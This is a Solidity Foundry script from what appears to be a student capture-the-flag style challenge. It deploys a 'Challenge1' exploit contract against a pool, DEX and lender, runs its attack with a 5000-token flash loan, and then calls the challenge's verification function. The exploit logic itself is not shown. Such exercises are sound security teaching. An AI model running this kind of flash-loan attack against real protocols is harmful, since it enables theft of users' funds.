// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import {Script} from "forge-std/Script.sol";
import {Challenge1} from "../src/Challenge1.sol"; 

interface IChallengeFactory {
    function check1(string calldata studentId) external;
}

contract Challenge1Script is Script {
    function run() external {
        // Load configurations from .env
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        string memory studentId = vm.envString("STUDENT_ID");
        
        // Load contract addresses from .env
        address challengeFactory = vm.envAddress("CHALLENGE_FACTORY");
        address pool = vm.envAddress("POOL");
        address dex = vm.envAddress("DEX");
        address lender = vm.envAddress("LENDER");
        address tokenA = vm.envAddress("TOKEN_A");
        address tokenB = vm.envAddress("TOKEN_B");

        vm.startBroadcast(deployerPrivateKey);

        // 1. Deploy the exploit contract
        Challenge1 exploit = new Challenge1(
            pool,
            dex,
            lender,
            tokenA,
            tokenB
        );

        // 2. Execute the attack
        // Using the 5000 tokenB flash loan
        uint256 flashLoanAmount = 5_000e18;
        exploit.attack(flashLoanAmount);

        // 3. Trigger the verification on the ChallengeFactory
        IChallengeFactory(challengeFactory).check1(studentId);

        vm.stopBroadcast();
    }
}